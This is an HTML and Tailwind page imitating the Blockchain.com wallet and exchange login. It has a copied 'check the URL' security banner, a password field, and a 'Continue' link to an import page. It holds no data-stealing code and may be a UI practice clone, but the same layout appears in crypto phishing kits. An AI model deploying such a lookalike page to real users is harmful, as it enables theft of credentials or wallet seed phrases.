<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BlockChain-login-page</title>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:400,300,700' rel='stylesheet' type='text/css'>
    <!-- Include the Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- font awesome cdn -->
    <link
    rel="stylesheet"
    href="https://site-assets.fontawesome.com/releases/v6.5.1/css/all.css"
    >
</head>

<body class="bg-[#121C35] text-white">
    <div class="bg-blue-500 text-center py-2">
        <p class="text-sm font-normal">For your security, make sure the URL is <a href="https://login.blockchain.com" class="font-semibold">https://login.blockchain.com</a></p>
    </div>

      <div class="text-center">
           <img src="./image/banner.jpeg" class="justify-center mx-auto w-full h-auto" alt="">
      </div>

    <!-- component -->
    <div class="flex items-center justify-center w-full">
      <div class="bg-white dark:bg-white shadow-md rounded-lg max-w-2xl">
        <div class="grid grid-cols-2 text-black text-lg lg:text-xl font-bold">
          <button id="walletBtn" class="bg-gray-200 p-3 lg:p-4 text-gray-500 rounded-tl-lg">
              <div class="flex gap-2 justify-center">
                  <img src="./image/wallet.jpeg" class="w-6 mt-1.5" alt=""> 
                  <h2>Wallet</h2>
              </div>
          </button>
          <button id="exchangeBtn" class="p-3 lg:p-4 text-[#7349F2] rounded-tr-lg"> 
            <div class="flex gap-2 justify-center">
              <img src="./image/exchanged.jpeg" class="w-6 mt-1.5" alt=""> 
              <h2>Exchange</h2>
            </div>
          </button>
        </div>
        
        <div id="exchangeForm">
            <form action="#" class="">
              <div class="px-8 py-6">
                <div class="mb-8">
                  <label for="password" class="sr-only block text-sm font-medium text-gray-800 mb-2">Password</label>
              
                  <div class="relative">
                    <input
                        type="password"
                        id="password" 
                        class="shadow-sm rounded-md w-full lg:w-96 md:w-80 px-3 py-3 border border-blue-700 focus:outline-none focus:ring-indigo-900 focus:border-red-500 text-black"
                        placeholder="Enter password"
                    />
                
                    <span class="absolute inset-y-0 end-0 grid place-content-center px-4" onclick="togglePasswordVisibility()">
                        <svg
                            xmlns="http://www.w3.org/2000/svg"
                            class="size-4 text-gray-400 cursor-pointer" 
                            fill="none"
                            viewBox="0 0 24 24"
                            stroke="currentColor"
                        >
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"
                            />
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"
                            />
                        </svg>
                    </span>
                </div>
                </div>
                
                <a href="/import.html" type="submit" class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-[#0C6CF2] hover:bg-[#0959c8] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-indigo-500 text-xl mb-3">Continue</a>
              </div>
              <div>
                <hr>
                <h2 class="text-gray-600 px-6 py-5 font-semibold text-center">Don't have a BlockChain Account? <a href="#" class="text-md font-semibold text-indigo-500 hover:text-indigo-700">Sign up Now <i class="fas fa-arrow-right"></i></a></h2>
              </div>
            </form>
          </div>
          
      </div>
    </div>

    <!-- Footer  -->
     <div class="flex gap-5 text-gray-400 justify-center my-7">
      <div class="">
        <button id="dropdownDefaultButton" data-dropdown-toggle="dropdown" class="text-gray-400 text-sm font-semibold px-0 pb-2.5 text-center inline-flex items-center" type="button">English <svg class="w-2.5 h-2.5 ms-2" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
          <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4"/>
          </svg>
          </button>
          
          <!-- Dropdown menu -->
          <div id="dropdown" class="z-10 hidden divide-y rounded-lg w-20 bg-gray-700">
              <ul class="py-2 text-sm text-gray-400" aria-labelledby="dropdownDefaultButton">
                <li>
                  <a href="#" class="block px-3 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">Bangla</a>
                </li>
                <li>
                  <a href="#" class="block px-4 py-2 hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white">Hindi</a>
                </li>
              </ul>
          </div>
      </div>
      <div>
        <h2>Version 4.98.10</h2>
      </div>
      <div>
        <h2>Need Help</h2>
      </div>
     </div>

     <!-- Javascript code here  -->
    <script>
        // show password
      function togglePasswordVisibility() {
        var passwordInput = document.getElementById("password");
        if (passwordInput.type === "password") {
            passwordInput.type = "text";
        } else {
            passwordInput.type = "password";
        }
    }

      // Dropdown toggle
      document.getElementById('dropdownDefaultButton').addEventListener('click', function() {
          var dropdownMenu = document.getElementById('dropdown');
          dropdownMenu.classList.toggle('hidden');
      });
    </script>
    
</body>

</html>
